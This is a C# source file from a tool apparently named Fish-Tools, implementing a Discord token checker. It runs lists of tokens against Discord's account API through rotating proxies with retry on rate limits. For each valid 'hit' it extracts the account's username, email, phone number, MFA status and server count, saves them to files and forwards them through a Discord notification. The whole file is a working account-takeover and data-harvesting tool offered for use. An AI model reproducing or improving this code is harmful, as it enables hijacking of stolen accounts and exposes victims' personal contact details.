/*
------------------------------------------------------------
Made By notfishvr
github: https://github.com/official-notfishvr/Fish-Tools
------------------------------------------------------------
*/
using Fish_Tools.core.Utils;
using Newtonsoft.Json;
using System.Net;
using System.Text;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    internal class DiscordAccountChecker : BaseAccountChecker
    {
        private bool EnableUserInfo { get; set; } = true;
        private bool EnableGuildInfo { get; set; } = false;

        public DiscordAccountChecker() : base("Discord")
        {
            CooldownTime = 350;
            MaxRetries = 2;
            EnableRetry = true;
        }

        protected override void GetAdditionalSettings(Logger logger)
        {
            base.GetAdditionalSettings(logger);
            logger.Info("Enable user information retrieval? (y/n):");
            Console.Write("-> ");
            string userInfo = Console.ReadLine()?.ToLower();
            EnableUserInfo = userInfo == "y" || userInfo == "yes";

            logger.Info("Enable guild/server information? (y/n):");
            Console.Write("-> ");
            string guildInfo = Console.ReadLine()?.ToLower();
            EnableGuildInfo = guildInfo == "y" || guildInfo == "yes";
        }

        protected override async Task ProcessCombo(string combo, Logger logger)
        {
            string token = combo.Trim();

            if (string.IsNullOrWhiteSpace(token))
            {
                logger.Error($"Invalid token: {combo}");
                SaveError(combo, "Empty token");
                return;
            }

            await RetryOperation(async () =>
            {
                await CheckLogin(token, logger);
            }, combo, logger);
        }

        private async Task CheckLogin(string token, Logger logger)
        {
            WebClient client;
            string proxy = GetNextProxy();
            if (!string.IsNullOrEmpty(proxy))
            {
                var webProxy = new System.Net.WebProxy(proxy);
                client = new WebClient { Proxy = webProxy };
                logger.Info($"Using proxy: {proxy}");
            }
            else
            {
                client = new WebClient();
            }
            try
            {
                client.Headers["Authorization"] = token;
                client.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

                // Test basic authentication
                string userResponse = await client.DownloadStringTaskAsync("https://discord.com/api/v9/users/@me");
                
                if (!string.IsNullOrEmpty(userResponse))
                {
                    string hitInfo = token;
                    string detailedInfo = token;

                    if (EnableUserInfo)
                    {
                        try
                        {
                            // Parse user information from JSON response
                            var userData = Newtonsoft.Json.JsonConvert.DeserializeObject<dynamic>(userResponse);
                            string username = userData.username;
                            string discriminator = userData.discriminator;
                            string email = userData.email;
                            string phone = userData.phone;
                            bool verified = userData.verified;
                            bool mfaEnabled = userData.mfa_enabled;

                            detailedInfo = $"{token} | Username: {username}#{discriminator}";
                            if (!string.IsNullOrEmpty(email)) detailedInfo += $" | Email: {email}";
                            if (!string.IsNullOrEmpty(phone)) detailedInfo += $" | Phone: {phone}";
                            detailedInfo += $" | Verified: {verified} | MFA: {mfaEnabled}";

                            if (EnableGuildInfo)
                            {
                                try
                                {
                                    string guildsResponse = await client.DownloadStringTaskAsync("https://discord.com/api/v9/users/@me/guilds");
                                    var guildsData = Newtonsoft.Json.JsonConvert.DeserializeObject<dynamic[]>(guildsResponse);
                                    detailedInfo += $" | Servers: {guildsData.Length}";
                                }
                                catch
                                {
                                    detailedInfo += " | Servers: Unable to fetch";
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            logger.Warn($"Failed to parse user info for token: {ex.Message}");
                        }
                    }

                    // Send Discord notification (no proxy)
                    if (UsingDiscord)
                    {
                        try
                        {
                            await SendDiscordNotification(detailedInfo);
                        }
                        catch (Exception ex)
                        {
                            logger.Warn($"Failed to send Discord notification: {ex.Message}");
                        }
                    }

                    logger.Success($"[HIT] {detailedInfo}");
                    SaveHit(hitInfo, detailedInfo);
                }
                else
                {
                    logger.Error($"[BAD] {token}");
                    SaveBad(token, "Invalid response");
                }
            }
            catch (WebException webEx) when (webEx.Response is HttpWebResponse response)
            {
                string errorMessage = $"HTTP {response.StatusCode}";
                
                switch (response.StatusCode)
                {
                    case HttpStatusCode.Unauthorized:
                        logger.Error($"[BAD] {token} | Unauthorized");
                        SaveBad(token, "Unauthorized");
                        break;
                    case HttpStatusCode.TooManyRequests:
                        logger.Warn($"[RATE_LIMITED] {token} | Rate limited");
                        SaveError(token, "Rate limited");
                        throw; // Retry this
                    default:
                        logger.Error($"[ERROR] {token} | {errorMessage}");
                        SaveError(token, errorMessage);
                        break;
                }
            }
            catch (Exception ex)
            {
                logger.Error($"[ERROR] {token} | {ex.Message}");
                SaveError(token, ex.Message);
                throw; // Re-throw for retry mechanism
            }
        }

        protected override bool ShouldRetry(Exception ex)
        {
            return ex.Message.Contains("Rate limited") ||
                   ex.Message.Contains("TooManyRequests") ||
                   ex.Message.Contains("NetworkError") ||
                   ex.Message.Contains("Timeout") ||
                   ex.Message.Contains("ServiceUnavailable");
        }

        protected override void UpdateProgress(Logger logger)
        {
            if (ProcessedCombos % 10 == 0 || ProcessedCombos == TotalCombos)
            {
                var elapsed = DateTime.Now - StartTime;
                var rate = ProcessedCombos > 0 ? elapsed.TotalSeconds / ProcessedCombos : 0;
                var remaining = (TotalCombos - ProcessedCombos) * rate;
                var successRate = TotalCombos > 0 ? (double)Hits / TotalCombos * 100 : 0;

                Console.Title = $"Fish Tools | Discord | Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Success: {successRate:F1}% | ETA: {TimeSpan.FromSeconds(remaining):mm\\:ss}";

                logger.Info($"Discord Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Bads: {Bads} | Errors: {Errors} | Success: {successRate:F1}% | Rate: {rate:F2}s/combo");
            }
        }

        protected override void ShowFinalResults(Logger logger)
        {
            var elapsed = DateTime.Now - StartTime;

            Console.WriteLine();
            logger.Success("=== DISCORD ACCOUNT CHECKING COMPLETED ===");
            logger.Info($"Total tokens: {TotalCombos}");
            logger.Info($"Valid tokens: {Hits}");
            logger.Info($"Invalid tokens: {Bads}");
            logger.Info($"Errors: {Errors}");
            logger.Info($"Success rate: {(double)Hits / TotalCombos * 100:F2}%");
            logger.Info($"Total time: {elapsed:hh\\:mm\\:ss}");
            logger.Info($"Average rate: {elapsed.TotalSeconds / TotalCombos:F2}s/token");
            logger.Info($"Hits saved to: {HitsFile}");
            logger.Info($"Detailed hits saved to: {HitsFileDetailed}");

            if (UsingDiscord)
                logger.Info("Discord notifications were sent");
        }
    }
}